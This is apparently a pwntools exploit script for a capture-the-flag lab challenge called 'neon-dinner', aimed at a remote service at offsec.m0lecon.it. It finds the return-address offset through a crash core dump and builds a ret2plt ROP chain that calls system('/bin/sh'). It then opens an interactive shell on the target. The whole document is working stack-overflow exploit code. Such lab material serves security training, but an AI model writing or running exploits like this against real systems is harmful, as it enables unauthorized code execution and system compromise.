from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13568

elf = ELF('/home/kali/Desktop/offsec/labs/lab6/challenges/00_neon-dinner/ret2plt')
context.binary = elf

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r

def get_ret_offset():
    # Start a dummy process to crash
    p_crash = process(elf.path)
    
    p_crash.recvuntil(b"order?\n")
    p_crash.sendline(cyclic(200))
    p_crash.wait()
    
    # Grab the core dump generated by the crash
    core = p_crash.corefile

    crash_value = core.read(core.rsp, 4)
    
    offset = cyclic_find(crash_value)
    print(f"Calculated offset to RIP: {offset}")
    return offset

OFFSET_TO_RIP = get_ret_offset() #72

rop = ROP(elf)  # no PIE so it's fixed like plt and got addr
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"Found 'ret' gadget at: {hex(ret_gadget)}")

pop_rdi_ret_addr = elf.sym.pop_rdi_ret
log.info(f"Found helper gadget 'pop_rdi_ret' function at: {hex(pop_rdi_ret_addr)}")

binsh_addr = next(elf.search(b'/bin/sh\x00'))    #address of "bin/sh"

system_plt_addr = elf.plt.system    #addr of system@plt

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    p64(pop_rdi_ret_addr),
    p64(binsh_addr),
    p64(system_plt_addr)
)

r = conn()
r.recvuntil(b"order?\n")

r.sendline(payload)

r.interactive()